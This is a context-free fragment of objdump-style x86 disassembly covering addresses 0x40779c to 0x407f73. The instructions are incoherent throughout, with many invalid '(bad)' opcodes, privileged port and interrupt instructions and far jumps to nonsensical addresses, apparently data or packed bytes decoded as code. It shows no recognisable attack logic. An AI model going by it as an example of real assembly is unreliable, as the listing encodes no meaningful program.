  40779c:	xchg   edi,eax
  40779d:	(bad)  
  40779e:	and    ch,cl
  4077a0:	js     0x4077de
  4077a2:	mov    al,0x27
  4077a4:	in     al,0x5e
  4077a6:	pop    esp
  4077a7:	outs   dx,DWORD PTR ds:[esi]
  4077a8:	pop    ebp
  4077a9:	pop    ebx
  4077aa:	add    bh,dl
  4077ac:	mov    ch,0xfe
  4077ae:	add    bl,bh
  4077b0:	and    BYTE PTR [ebp-0x15],ah
  4077b3:	sti    
  4077b4:	sub    esi,DWORD PTR [edx]
  4077b6:	adc    al,0xb5
  4077b8:	enter  0xcde8,0xd1
  4077bc:	or     bh,dl
  4077be:	pop    esi
  4077bf:	push   ecx
  4077c0:	imul   BYTE PTR [esi+ecx*4]
  4077c3:	test   ah,dh
  4077c5:	test   ecx,edi
  4077c7:	out    0x97,eax
  4077c9:	dec    eax
  4077ca:	ror    ebx,1
  4077cc:	(bad)  
  4077cd:	das    
  4077ce:	cmp    BYTE PTR ds:0x63e529b5,cl
  4077d4:	arpl   WORD PTR [esi+0xd],di
  4077d7:	sub    al,0x9b
  4077d9:	rcl    BYTE PTR [edx+eax*8-0x65],1
  4077dd:	jecxz  0x407795
  4077df:	inc    esp
  4077e0:	pop    di
  4077e2:	jae    0x407767
  4077e4:	mov    eax,0x934ab48b
  4077e9:	shl    DWORD PTR [ebx-0x5b],0x9
  4077ed:	sub    DWORD PTR [edx],edi
  4077ef:	push   es
  4077f0:	test   al,0xa9
  4077f2:	or     edx,DWORD PTR [edx+ecx*1-0x4e8f633]
  4077f9:	add    al,0xfe
  4077fb:	cmp    DWORD PTR [esi+0x14],edi
  4077fe:	mov    BYTE PTR [edi+0x19791e67],al
  407804:	push   0xffffffc6
  407806:	dec    edi
  407807:	mov    edx,0xf39343e0
  40780c:	repz jnp 0x4077f6
  40780f:	xor    BYTE PTR [ecx-0x4ca8aae6],ah
  407815:	outs   dx,DWORD PTR ds:[esi]
  407816:	rcl    BYTE PTR [edx],cl
  407818:	push   0xffffff86
  40781a:	jg     0x407813
  40781c:	mov    bh,0xba
  40781e:	jp     0x4077e6
  407820:	test   al,0x3
  407822:	icebp  
  407823:	(bad)  
  407824:	dec    edi
  407825:	pushf  
  407826:	dec    esp
  407827:	mov    eax,DWORD PTR [edx+0x709583e5]
  40782d:	les    ebx,FWORD PTR [ebp+0x4356f0c2]
  407833:	leave  
  407834:	push   0x43e5de33
  407839:	jl     0x4078ac
  40783b:	pop    esp
  40783c:	dec    edi
  40783d:	dec    esp
  40783e:	sbb    dh,BYTE PTR [edi-0x3d]
  407841:	popf   
  407842:	pop    ebp
  407843:	(bad)  [ecx+ebx*2+0x2b]
  407847:	test   al,0x99
  407849:	mov    ebp,0x62d0246e
  40784e:	and    DWORD PTR [edx+0x3b719929],esi
  407854:	div    BYTE PTR [ecx-0x49764b01]
  40785a:	fisttp QWORD PTR [esi+0x78f7846]
  407860:	sub    dl,ch
  407862:	je     0x4077ec
  407864:	std    
  407865:	sbb    al,0x65
  407867:	push   ebp
  407868:	sub    dl,BYTE PTR [esi-0x80]
  40786b:	not    BYTE PTR [esi-0x4d]
  40786e:	popa   
  40786f:	(bad)  
  407870:	push   ss
  407871:	shl    BYTE PTR [edx],1
  407873:	mov    ch,0x56
  407875:	mov    dh,0xc1
  407877:	mov    al,BYTE PTR [ebp+0x48]
  40787a:	xchg   BYTE PTR [edi],al
  40787c:	(bad)  
  40787d:	(bad)  [edx]
  40787f:	mov    al,0x66
  407881:	sbb    ah,BYTE PTR [esi-0x39]
  407884:	retf   
  407885:	mov    ecx,DWORD PTR [edi-0x27]
  407888:	mov    cl,0xf4
  40788a:	xchg   DWORD PTR [ecx+0x7c],edi
  40788d:	sahf   
  40788e:	xor    DWORD PTR gs:[esi],0xed809d36
  407895:	mov    cl,0x9d
  407897:	push   edx
  407898:	test   al,0x3c
  40789a:	shr    BYTE PTR [esi+eax*1],1
  40789d:	es push ebx
  40789f:	inc    ebp
  4078a0:	and    BYTE PTR [esi-0x45],bl
  4078a3:	mov    ch,0x9f
  4078a5:	adc    edx,esp
  4078a7:	mov    ebp,0xb329a907
  4078ac:	cmp    esi,0x27
  4078af:	nop
  4078b0:	fsub   QWORD PTR [eax-0x7bf713f4]
  4078b6:	pop    ss
  4078b7:	jge    0x4078bd
  4078b9:	addr16 nop
  4078bb:	clc    
  4078bc:	pop    esi
  4078bd:	pop    edx
  4078be:	cdq    
  4078bf:	loopne 0x40788d
  4078c1:	add    al,0xf4
  4078c3:	sbb    DWORD PTR [ebx],edx
  4078c5:	shl    edi,0xb0
  4078c8:	xchg   ecx,eax
  4078c9:	push   ss
  4078ca:	icebp  
  4078cb:	dec    ebp
  4078cc:	fwait
  4078cd:	cdq    
  4078ce:	add    edi,DWORD PTR [esi+0x65]
  4078d1:	adc    BYTE PTR [edi+eiz*8],bh
  4078d4:	cmp    bh,dh
  4078d6:	mov    al,ds:0x1a151886
  4078db:	out    0xdb,al
  4078dd:	jge    0x407933
  4078df:	sub    DWORD PTR [ebp-0x5851bab3],esi
  4078e5:	xchg   edi,eax
  4078e6:	(bad)  
  4078e7:	adc    DWORD PTR [ebp-0x478ae26c],edi
  4078ed:	cwde   
  4078ee:	daa    
  4078ef:	add    BYTE PTR [edx-0xb],0xfe
  4078f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f4:	and    esp,DWORD PTR [edi+ebx*4-0x70e342de]
  4078fb:	leave  
  4078fc:	and    al,bl
  4078fe:	add    BYTE PTR [esi-0x18e8dea5],0x7e
  407905:	mov    ds:0xdc391711,eax
  40790a:	mov    edi,0xd2b1f5e6
  40790f:	jmp    0x40792e
  407911:	push   esp
  407912:	ja     0x4078f9
  407914:	add    DWORD PTR [ebp+ebx*2+0x35ac0cd5],esi
  40791b:	adc    bl,BYTE PTR [ebp+ebp*2-0x68]
  40791f:	into   
  407920:	mov    ds:0xcf95bbcb,eax
  407925:	sub    eax,0x8063d9a9
  40792a:	jmp    0xd82b:0x3c489041
  407931:	pop    ss
  407932:	push   0x2d
  407934:	cdq    
  407935:	push   ebp
  407936:	nop
  407937:	adc    esi,edx
  407939:	hlt    
  40793a:	in     eax,0x3b
  40793c:	iret   
  40793d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793e:	pop    ebx
  40793f:	mov    edi,0xf1133620
  407944:	nop
  407945:	(bad)  
  407946:	mov    eax,ds:0x2a86bfc3
  40794b:	loope  0x407968
  40794d:	adc    dl,BYTE PTR [edx+edi*8-0x6fd9cf05]
  407954:	fimul  WORD PTR [ecx]
  407956:	adc    BYTE PTR [ecx-0x61],al
  407959:	push   esi
  40795a:	shl    BYTE PTR [ecx],1
  40795c:	jae    0x407901
  40795e:	shl    BYTE PTR [ecx+0x7c],0xb3
  407962:	(bad)  
  407963:	addr16 jl 0x407948
  407966:	mov    eax,0x70c3ba08
  40796b:	push   cs
  40796c:	mov    ch,0xde
  40796e:	out    0xe8,eax
  407970:	in     al,0xf
  407972:	dec    eax
  407973:	scas   eax,DWORD PTR es:[edi]
  407974:	hlt    
  407975:	mov    edx,0x373e7f55
  40797a:	jmp    0xafa4bc27
  40797f:	mov    ah,0xa1
  407981:	add    edi,DWORD PTR [eax+0x5c]
  407984:	mov    ah,0xf4
  407986:	imul   esi,DWORD PTR [ebx],0xe4cdf9fb
  40798c:	push   ecx
  40798d:	mov    ecx,0xaaf82126
  407992:	jecxz  0x4079e5
  407994:	idiv   BYTE PTR [ebp-0x3c]
  407997:	push   ds
  407998:	xor    BYTE PTR [esi-0x5c7b9e99],bh
  40799e:	in     eax,0xd8
  4079a0:	sbb    BYTE PTR [edx+0x4f],al
  4079a3:	js     0x407a22
  4079a5:	and    BYTE PTR [eax-0x6b5ea36d],ch
  4079ab:	loope  0x4079f0
  4079ad:	pusha  
  4079ae:	(bad)  
  4079af:	cmp    ebx,0xff20c56c
  4079b5:	loop   0x4079ed
  4079b7:	iret   
  4079b8:	scas   eax,DWORD PTR es:[edi]
  4079b9:	lock push ecx
  4079bb:	pop    esi
  4079bc:	adc    DWORD PTR [ecx+0x34],0xffffff94
  4079c0:	rcl    DWORD PTR [ebx],cl
  4079c2:	ins    BYTE PTR es:[edi],dx
  4079c3:	push   esp
  4079c4:	call   0x10d1:0xbda540be
  4079cb:	pop    ebp
  4079cc:	int    0x12
  4079ce:	shl    dh,0xdf
  4079d1:	jmp    0xab7f:0x98a5ae43
  4079d8:	push   ds
  4079d9:	aaa    
  4079da:	dec    esi
  4079db:	sub    DWORD PTR ds:0x41e61879,edx
  4079e1:	lea    edx,[ebx]
  4079e3:	lea    esi,[ebp+0x60]
  4079e6:	xchg   ebx,eax
  4079e7:	push   cs
  4079e8:	sbb    eax,ebx
  4079ea:	sbb    al,0x17
  4079ec:	ja     0x4079c9
  4079ee:	mov    ebx,0xea1a61d3
  4079f3:	dec    eax
  4079f4:	jmp    0x184d:0x11631820
  4079fb:	in     eax,0x51
  4079fd:	das    
  4079fe:	lods   al,BYTE PTR ds:[esi]
  4079ff:	fsubr  st(4),st
  407a01:	and    eax,0xb3d2659a
  407a06:	mov    esp,?
  407a08:	popf   
  407a09:	fs or  bl,0x8
  407a0d:	mov    ch,0xd9
  407a0f:	test   edx,ebx
  407a11:	adc    al,0x81
  407a13:	int    0xa9
  407a15:	aad    0x2b
  407a17:	push   edx
  407a18:	mov    esi,0xfefaa3db
  407a1d:	shl    DWORD PTR [ecx-0x54],1
  407a20:	fmul   st(5),st
  407a22:	(bad)  
  407a23:	(bad)  
  407a24:	mov    edx,0x5c3b7d60
  407a29:	jnp    0x4079f7
  407a2b:	lahf   
  407a2c:	mov    ebx,0xe1db71bb
  407a31:	ret    0xcd23
  407a34:	add    DWORD PTR [ebx+0x553cf250],eax
  407a3a:	test   DWORD PTR [esi],ebp
  407a3c:	(bad)  
  407a3d:	sti    
  407a3e:	imul   ebp,DWORD PTR [edi+0xa],0xffffffae
  407a42:	fisttp QWORD PTR [ebx-0x28]
  407a45:	(bad)  
  407a46:	xchg   esi,eax
  407a47:	ret    0xaedb
  407a4a:	pop    ebx
  407a4b:	cmp    DWORD PTR [edx+0x1e789f7],ebp
  407a51:	shl    eax,0x80
  407a54:	pop    ss
  407a55:	mov    esi,0x7afc5198
  407a5a:	mov    esp,edx
  407a5c:	ins    DWORD PTR es:[edi],dx
  407a5d:	(bad)  
  407a5e:	cli    
  407a5f:	inc    edi
  407a60:	dec    edx
  407a61:	shl    DWORD PTR [eax],cl
  407a63:	int    0x4d
  407a65:	pop    es
  407a66:	pop    esp
  407a67:	rol    DWORD PTR [eax-0x22ea3fea],0x5b
  407a6e:	jmp    0xd092:0x4354e608
  407a75:	js     0x407a6f
  407a77:	inc    eax
  407a78:	iret   
  407a79:	xchg   edx,eax
  407a7a:	cmp    DWORD PTR [ebp+0x7421471],ecx
  407a80:	jns    0x407a09
  407a82:	or     dh,BYTE PTR [edx]
  407a84:	or     eax,DWORD PTR [ebp-0x6711d209]
  407a8a:	ret    0xc1e8
  407a8d:	jnp    0x407a45
  407a8f:	xchg   esi,eax
  407a90:	popf   
  407a91:	mov    ebx,0xf1ff37d5
  407a96:	test   eax,0x7329ca95
  407a9b:	lock xor dl,BYTE PTR ss:[ebx-0x6e6f4db0]
  407aa3:	jb     0x407ad4
  407aa5:	inc    esp
  407aa6:	adc    eax,0x40839bd3
  407aab:	arpl   WORD PTR [eax+ecx*4+0x6d139c3e],dx
  407ab2:	xchg   esi,eax
  407ab3:	add    al,0x76
  407ab5:	mov    esp,0xbe695986
  407aba:	inc    edx
  407abb:	lahf   
  407abc:	cwde   
  407abd:	and    cl,BYTE PTR [edi+0x24aaee02]
  407ac3:	fs inc eax
  407ac5:	shr    BYTE PTR [ebx-0x215492a3],0x9b
  407acc:	not    BYTE PTR [ebp-0x1707ab46]
  407ad2:	mov    ebx,0x36247616
  407ad7:	rol    BYTE PTR [eax+eax*4+0x53],cl
  407adb:	pushf  
  407adc:	add    esi,DWORD PTR [eax-0x68]
  407adf:	out    dx,eax
  407ae0:	add    al,0x32
  407ae2:	dec    esp
  407ae3:	pop    esi
  407ae4:	imul   edi,DWORD PTR [eax],0x16
  407ae7:	idiv   BYTE PTR [ebp+0x33ec22eb]
  407aed:	mov    WORD PTR [edi-0x3],?
  407af0:	std    
  407af1:	fcmovnb st,st(3)
  407af3:	adc    BYTE PTR [esp+edi*2-0xbcdaf9c],0x6c
  407afb:	jg     0x407b17
  407afd:	adc    ah,BYTE PTR [ecx]
  407aff:	jns    0x407b1c
  407b01:	xor    eax,0xe4b407a2
  407b06:	daa    
  407b07:	adc    BYTE PTR [ecx-0x7eea5a0f],0x14
  407b0e:	cmp    esi,DWORD PTR [eax+0x11]
  407b11:	(bad)  
  407b12:	ret    0xc1a1
  407b15:	dec    ebx
  407b16:	or     esp,DWORD PTR [esi+0x5]
  407b19:	mov    bl,0xb4
  407b1b:	mov    ah,0x5f
  407b1d:	shr    dl,1
  407b1f:	fist   DWORD PTR [ecx+ebx*2]
  407b22:	jl     0x407aff
  407b24:	(bad)  
  407b25:	rcl    BYTE PTR [eax],0xa6
  407b28:	(bad)  
  407b29:	cmp    BYTE PTR [ecx-0x60],ah
  407b2c:	ds or  eax,0x847aaab4
  407b32:	mov    ah,0x6b
  407b34:	xor    al,0x44
  407b36:	jb     0x407b35
  407b38:	std    
  407b39:	or     eax,0x5223c809
  407b3e:	outs   dx,DWORD PTR ds:[esi]
  407b3f:	mov    ch,0xe1
  407b41:	addr16 cmp eax,0x1da53cdc
  407b47:	call   0x534b18fd
  407b4c:	retf   
  407b4d:	mov    bl,0x99
  407b4f:	scas   al,BYTE PTR es:[edi]
  407b50:	enter  0xf681,0x5
  407b54:	jg     0x407aef
  407b56:	lea    esp,[ecx+0x78]
  407b59:	pop    ebx
  407b5a:	sbb    eax,0xdaf789f2
  407b5f:	xchg   esi,eax
  407b60:	push   0x216a660d
  407b65:	pusha  
  407b66:	stos   DWORD PTR es:[edi],eax
  407b67:	xchg   ecx,eax
  407b68:	sar    WORD PTR [ebp+0xa49fe50],cl
  407b6f:	sbb    cl,BYTE PTR [eax+0x2bf5906d]
  407b75:	loopne 0x407be4
  407b77:	lods   eax,DWORD PTR ds:[esi]
  407b78:	in     eax,dx
  407b79:	idiv   eax
  407b7b:	ret    
  407b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b7d:	stos   DWORD PTR es:[edi],eax
  407b7e:	inc    esp
  407b7f:	stc    
  407b80:	in     eax,0x10
  407b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b83:	ins    DWORD PTR es:[edi],dx
  407b84:	add    DWORD PTR [ecx+0x29],edx
  407b87:	aam    0xc
  407b89:	pop    esp
  407b8a:	call   0x31f2:0x788c3800
  407b91:	bound  esp,QWORD PTR [ecx+edx*8]
  407b94:	pushf  
  407b95:	or     ebx,ebx
  407b97:	loope  0x407bd5
  407b99:	ficomp WORD PTR [edi]
  407b9b:	sub    al,0x4b
  407b9d:	test   DWORD PTR [eax+edi*8-0x31e9fb84],eax
  407ba4:	ins    DWORD PTR es:[edi],dx
  407ba5:	stos   BYTE PTR es:[edi],al
  407ba6:	mov    eax,ds:0xb0f8a3b4
  407bab:	xor    DWORD PTR [ebp+0x3118bc77],ebx
  407bb1:	sti    
  407bb2:	popa   
  407bb3:	or     eax,eax
  407bb5:	push   ss
  407bb6:	lods   al,BYTE PTR ds:[esi]
  407bb7:	mov    ecx,DWORD PTR [edx]
  407bb9:	(bad)  
  407bba:	sub    al,0x3b
  407bbc:	sbb    eax,0x8b1af50c
  407bc1:	lea    eax,[edx+ecx*2]
  407bc4:	enter  0x7c0c,0xfc
  407bc8:	aad    0x42
  407bca:	jecxz  0x407c1e
  407bcc:	pop    ecx
  407bcd:	push   ebx
  407bce:	jmp    0x407baf
  407bd0:	je     0x407bf7
  407bd2:	mov    ds:0x77752f59,eax
  407bd7:	xlat   BYTE PTR ds:[ebx]
  407bd8:	xor    eax,0xffffffc6
  407bdb:	ds clc 
  407bdd:	bound  ebp,QWORD PTR [ecx+0x52]
  407be0:	mov    ch,0xbc
  407be2:	cs xchg esp,eax
  407be4:	mov    cl,0x75
  407be6:	cmp    DWORD PTR [edi+0x54],edi
  407be9:	out    dx,eax
  407bea:	pop    ecx
  407beb:	sbb    BYTE PTR [eax+0x3f],dl
  407bee:	in     eax,dx
  407bef:	inc    esp
  407bf0:	adc    eax,0x964f61bd
  407bf5:	pop    edi
  407bf6:	outs   dx,DWORD PTR ds:[esi]
  407bf7:	bound  edx,QWORD PTR [edi]
  407bf9:	jl     0x407bce
  407bfb:	imul   ebp,DWORD PTR [eax+0x41e7deaa],0x33
  407c02:	ret    
  407c03:	mov    DWORD PTR [edx-0x55],ebx
  407c06:	inc    edx
  407c07:	mov    bl,0xbb
  407c09:	in     eax,0xfb
  407c0b:	rcr    BYTE PTR [edx],cl
  407c0d:	add    bh,BYTE PTR [ecx]
  407c0f:	shl    dh,1
  407c11:	imul   esp,DWORD PTR [ebx-0x6a],0x312ea612
  407c18:	jno    0x407bd3
  407c1a:	mov    ds:0xa83d5ba4,al
  407c1f:	push   ebx
  407c20:	mov    dl,0x6e
  407c22:	mov    DWORD PTR [ebx+ebp*2],edi
  407c25:	and    eax,0xf9bda040
  407c2a:	das    
  407c2b:	mov    edx,0x671ebfee
  407c30:	loope  0x407bc3
  407c32:	mov    cs,WORD PTR [edi-0x4cd824a]
  407c38:	fadd   QWORD PTR [ebx+edx*1-0x2c]
  407c3c:	pop    edx
  407c3d:	fdiv   QWORD PTR [ebx-0x4058b5b3]
  407c43:	xchg   esp,eax
  407c44:	lock sub BYTE PTR [eax-0x38670bbf],bh
  407c4b:	mov    BYTE PTR [ebp-0x52270bd],al
  407c51:	mov    bl,0x3e
  407c53:	mov    edx,0x7b20a3f9
  407c58:	add    eax,0xb1c3d394
  407c5d:	gs stos DWORD PTR es:[edi],eax
  407c5f:	dec    edx
  407c60:	pop    eax
  407c61:	in     al,0x9d
  407c63:	lahf   
  407c64:	push   ds
  407c65:	push   ebx
  407c66:	push   esi
  407c67:	add    eax,0xb439c9b9
  407c6c:	mov    ds:0x4f2a6fe3,al
  407c71:	test   al,0xa6
  407c73:	jmp    0x30471c7c
  407c78:	lahf   
  407c79:	cmc    
  407c7a:	xor    al,0x5a
  407c7c:	retf   
  407c7d:	xor    dh,BYTE PTR [ebx+0x1d]
  407c80:	xchg   edx,eax
  407c81:	les    esp,FWORD PTR ds:0x67986127
  407c87:	ins    DWORD PTR es:[edi],dx
  407c88:	jns    0x407c5e
  407c8a:	(bad)  
  407c8b:	mov    dh,0xf
  407c8d:	mov    dl,0x66
  407c8f:	xchg   esi,eax
  407c90:	jno    0x407cb7
  407c92:	int    0x21
  407c94:	lock popa 
  407c96:	xor    edi,DWORD PTR [edi]
  407c98:	cmp    eax,0xe1f8117d
  407c9d:	push   ebp
  407c9e:	jp     0x407c95
  407ca0:	add    al,0xea
  407ca2:	shl    DWORD PTR [edx-0x53],1
  407ca5:	test   DWORD PTR [ebx+0x1d6f1e09],esi
  407cab:	fld    QWORD PTR [edx+0x12]
  407cae:	repnz add esi,ebp
  407cb1:	push   ebx
  407cb2:	rep stos BYTE PTR es:[edi],al
  407cb4:	lds    edx,FWORD PTR [edi-0x10]
  407cb7:	push   0x3115dc10
  407cbc:	out    dx,al
  407cbd:	push   esp
  407cbe:	jge    0x407d17
  407cc0:	adc    bh,BYTE PTR [edi]
  407cc2:	aam    0x2e
  407cc4:	xchg   BYTE PTR [eax-0x78],dh
  407cc7:	out    dx,eax
  407cc8:	imul   BYTE PTR [edi+0x5b]
  407ccb:	xor    DWORD PTR [eax+0x33],eax
  407cce:	xchg   ebx,eax
  407ccf:	test   ecx,esp
  407cd1:	push   0xff0d4667
  407cd6:	or     DWORD PTR ds:0x8d31ffa,edi
  407cdc:	loop   0x407ca5
  407cde:	repnz adc ebp,DWORD PTR [eax+0x17]
  407ce2:	in     al,0x2
  407ce4:	push   cs
  407ce5:	sbb    al,0xea
  407ce7:	fcmovnbe st,st(6)
  407ce9:	dec    ebp
  407cea:	mov    esp,0x39c3158
  407cef:	daa    
  407cf0:	cwde   
  407cf1:	adc    DWORD PTR [ecx+0x50a8d850],ecx
  407cf7:	mov    cl,0xf
  407cf9:	sub    ch,al
  407cfb:	sahf   
  407cfc:	mov    ecx,0x3f620a2
  407d01:	outs   dx,BYTE PTR ds:[esi]
  407d02:	lods   al,BYTE PTR ds:[esi]
  407d03:	enter  0xbbcc,0x36
  407d07:	mov    esi,0xac6dfa9a
  407d0c:	ret    
  407d0d:	mov    DWORD PTR [eax+0x36],ebp
  407d10:	out    0x73,eax
  407d12:	scas   eax,DWORD PTR es:[edi]
  407d13:	sbb    edx,DWORD PTR [ebx-0x60]
  407d16:	sub    ah,al
  407d18:	add    DWORD PTR [ebx+ebx*4+0x6bf922e8],0xffffffa8
  407d20:	dec    ebx
  407d21:	popf   
  407d22:	out    dx,al
  407d23:	ret    
  407d24:	xchg   edi,eax
  407d25:	add    BYTE PTR [ecx+edx*2-0x29fbcf17],cl
  407d2c:	call   0x113f:0xa97a9381
  407d33:	push   ebx
  407d34:	mov    BYTE PTR [ebx+0x3d],dl
  407d37:	adc    ebx,eax
  407d39:	dec    ebx
  407d3a:	fistp  WORD PTR [ebp+ecx*1-0x5aaf4039]
  407d41:	adc    eax,0x69a9da68
  407d46:	aad    0xbb
  407d48:	std    
  407d49:	mov    cl,0x94
  407d4b:	pushf  
  407d4c:	adc    esp,DWORD PTR [ebp+0x2a]
  407d4f:	inc    ebx
  407d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d51:	rcr    DWORD PTR [esi-0x51],cl
  407d54:	inc    esi
  407d55:	mov    dh,0x1
  407d57:	pop    edi
  407d58:	retf   
  407d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d5a:	into   
  407d5b:	sbb    BYTE PTR [esi-0x12],bh
  407d5e:	sbb    eax,0x48ff67cf
  407d63:	sbb    eax,0xeff7af95
  407d68:	cwde   
  407d69:	sbb    ch,ah
  407d6b:	mov    ebp,0xbab694e6
  407d70:	loope  0x407d72
  407d72:	sub    eax,0x50203365
  407d77:	retf   
  407d78:	xchg   ebx,eax
  407d79:	sub    al,0x7
  407d7b:	(bad)  
  407d7e:	daa    
  407d7f:	jp     0x407dd3
  407d81:	add    cl,BYTE PTR [ecx-0x1a5504c0]
  407d87:	shrd   DWORD PTR [ecx+0x9],esp,0x56
  407d8c:	fidivr DWORD PTR [esi]
  407d8e:	lods   al,BYTE PTR ds:[esi]
  407d8f:	pop    ecx
  407d90:	lea    esp,[ebx-0x3f]
  407d93:	rcr    edi,1
  407d95:	sub    eax,0x3bb9647d
  407d9a:	jge    0x407d35
  407d9c:	sbb    ah,BYTE PTR [ecx+0x12]
  407d9f:	shl    DWORD PTR [ebx+0x74],cl
  407da2:	pop    edi
  407da3:	sub    al,0xb0
  407da5:	stc    
  407da6:	dec    ecx
  407da7:	fcmovnb st,st(5)
  407da9:	jo     0x407d4b
  407dab:	rcl    BYTE PTR [ecx-0x3d],0x3f
  407daf:	pop    esi
  407db0:	lock lahf 
  407db2:	xchg   DWORD PTR [eax+esi*8-0x2fe44468],ebp
  407db9:	enter  0x8e6f,0x40
  407dbd:	cmc    
  407dbe:	nop
  407dbf:	cmp    al,0x52
  407dc1:	out    0xf7,al
  407dc3:	inc    ebx
  407dc4:	je     0x407d71
  407dc6:	add    al,0x8
  407dc9:	mov    cl,0x3f
  407dcb:	mov    dl,BYTE PTR [eax-0x49ba256]
  407dd1:	in     eax,dx
  407dd2:	jnp    0x407da5
  407dd4:	stc    
  407dd5:	retf   0xcbdb
  407dd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd9:	repnz mov esp,0x9081f662
  407ddf:	loop   0x407e1d
  407de1:	add    ah,BYTE PTR [esi+0x5d955126]
  407de7:	lahf   
  407de8:	inc    edx
  407de9:	push   0xffffffa0
  407deb:	stc    
  407dec:	mov    bh,0xac
  407dee:	dec    ebp
  407def:	sub    BYTE PTR [ecx+eiz*1],0x7b
  407df3:	iret   
  407df4:	sahf   
  407df5:	add    BYTE PTR ds:0x5d318efa,dh
  407dfb:	mov    ebp,0xae4dcae7
  407e00:	inc    ebp
  407e01:	std    
  407e02:	add    BYTE PTR [edx-0x77],ch
  407e05:	fwait
  407e06:	pop    edi
  407e07:	mov    gs,WORD PTR [esp+eax*8]
  407e0a:	outs   dx,DWORD PTR ds:[esi]
  407e0b:	mov    esp,0xe662775c
  407e10:	mov    al,0x37
  407e12:	aam    0x59
  407e14:	mov    dh,0x19
  407e16:	or     eax,0x5a1461d2
  407e1b:	cmp    DWORD PTR [esi+esi*1],esp
  407e1e:	clc    
  407e1f:	mov    al,ds:0xb939589
  407e24:	sub    BYTE PTR [esi-0x409aecdd],dl
  407e2a:	xor    eax,0x1ad26982
  407e2f:	daa    
  407e30:	lods   eax,DWORD PTR ds:[esi]
  407e31:	xchg   DWORD PTR [edi],edi
  407e33:	clc    
  407e34:	hlt    
  407e35:	mov    al,ds:0xdae51cd6
  407e3a:	dec    edx
  407e3b:	push   eax
  407e3c:	xor    ch,ah
  407e3e:	xor    al,0x66
  407e40:	push   es
  407e41:	mov    ecx,ss
  407e43:	iret   
  407e44:	call   0x7023134e
  407e49:	outs   dx,DWORD PTR ds:[esi]
  407e4a:	jmp    0xc54796f6
  407e4f:	mov    cl,0x52
  407e51:	adc    ch,al
  407e53:	dec    ebx
  407e54:	push   edi
  407e55:	mov    cl,0x35
  407e57:	lea    esp,[esi+esi*2+0x204be056]
  407e5e:	mov    BYTE PTR [eax-0x64ca4670],bh
  407e64:	add    eax,0x3d960bad
  407e69:	mov    ds:0x37696fb7,eax
  407e6e:	shl    BYTE PTR [edi],1
  407e70:	hlt    
  407e71:	mov    BYTE PTR [eax+0x11],0xc3
  407e75:	hlt    
  407e76:	sbb    BYTE PTR [ebx+0x73ca6e35],bl
  407e7c:	ins    BYTE PTR es:[edi],dx
  407e7d:	rcr    ch,0xbd
  407e80:	js     0x407ea2
  407e82:	push   esp
  407e83:	out    dx,eax
  407e84:	and    al,0x62
  407e86:	mov    esi,0x3393835e
  407e8b:	adc    eax,0xd18122d4
  407e90:	xor    esp,ecx
  407e92:	xor    BYTE PTR [edi],ah
  407e94:	mov    ds:0x1d737d3b,al
  407e99:	mov    WORD PTR [ecx],?
  407e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e9c:	and    BYTE PTR [ebx],al
  407e9e:	adc    eax,0x241deada
  407ea3:	imul   eax,DWORD PTR gs:[edx-0x43],0x3c0ed97f
  407eab:	or     DWORD PTR [edx-0x3cf1c81],ecx
  407eb1:	das    
  407eb2:	stos   BYTE PTR es:[edi],al
  407eb3:	mov    bl,BYTE PTR [edi+0x3b]
  407eb6:	imul   esi,DWORD PTR [ebp+0xb],0x821c52b8
  407ebd:	mov    edi,0x633d8710
  407ec2:	dec    eax
  407ec3:	pop    ebp
  407ec4:	mov    ch,0xa4
  407ec6:	(bad)  
  407ec7:	xchg   ecx,eax
  407ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ec9:	mov    eax,ebx
  407ecb:	push   ebp
  407ecc:	mov    dh,0x3f
  407ece:	add    BYTE PTR [esi+0x2a45ef5a],0x12
  407ed5:	xor    edx,DWORD PTR [ebp-0x22]
  407ed8:	not    ecx
  407eda:	call   0xf56d:0x70cc81c2
  407ee1:	pop    ebp
  407ee2:	cdq    
  407ee3:	xor    cl,bh
  407ee5:	sti    
  407ee6:	mov    ds:0x423c22b,eax
  407eeb:	pop    ebp
  407eec:	dec    edi
  407eed:	pop    ebp
  407eee:	add    eax,0xd05cf74f
  407ef3:	rcr    DWORD PTR [ecx+0xa],1
  407ef6:	dec    edx
  407ef7:	int3   
  407ef8:	or     al,0x3f
  407efa:	push   eax
  407efb:	xor    edx,edx
  407efd:	pop    ebp
  407efe:	retf   0x186
  407f01:	or     esi,DWORD PTR [edx-0x5a]
  407f04:	dec    ecx
  407f05:	sbb    eax,0x5778984a
  407f0a:	push   ebx
  407f0b:	and    BYTE PTR ds:0x20da52cd,0x97
  407f12:	nop
  407f13:	das    
  407f14:	test   al,0xbf
  407f16:	les    edx,FWORD PTR [ecx]
  407f18:	or     bl,BYTE PTR [ecx]
  407f1a:	sti    
  407f1b:	sbb    cl,ch
  407f1d:	jnp    0x407f98
  407f1f:	mov    ?,WORD PTR [eax+0x4cde6fa5]
  407f25:	xchg   BYTE PTR ds:0xe2d78d0d,ch
  407f2b:	aad    0xe8
  407f2d:	(bad)  
  407f2e:	mov    eax,ds:0xa7905048
  407f33:	cmp    DWORD PTR [edx-0x7e],edi
  407f36:	das    
  407f37:	xor    edx,esp
  407f39:	dec    edi
  407f3a:	scas   eax,DWORD PTR es:[edi]
  407f3b:	mov    dh,0xdc
  407f3d:	shl    DWORD PTR [edi],0xff
  407f40:	sub    bh,BYTE PTR [edi-0x4a]
  407f43:	scas   al,BYTE PTR es:[edi]
  407f44:	fstp   QWORD PTR [esp+ebp*1]
  407f47:	inc    ebx
  407f48:	mov    esp,0x8b6b14ec
  407f4d:	jae    0x407f49
  407f4f:	sub    al,0x88
  407f51:	es xor al,0xd2
  407f54:	sbb    eax,0x92ac8523
  407f59:	mov    eax,ds:0xb3daab90
  407f5e:	ror    DWORD PTR [ebp-0x231a20d6],cl
  407f64:	mov    DWORD PTR [edx+edx*8-0x5a],edx
  407f68:	ret    0x2dac
  407f6b:	call   0x73604119
  407f70:	test   DWORD PTR [ebp-0x7f],esp
  407f73:	add    DWORD PTR [ebx+ebp*1-0x38fc00db],eax
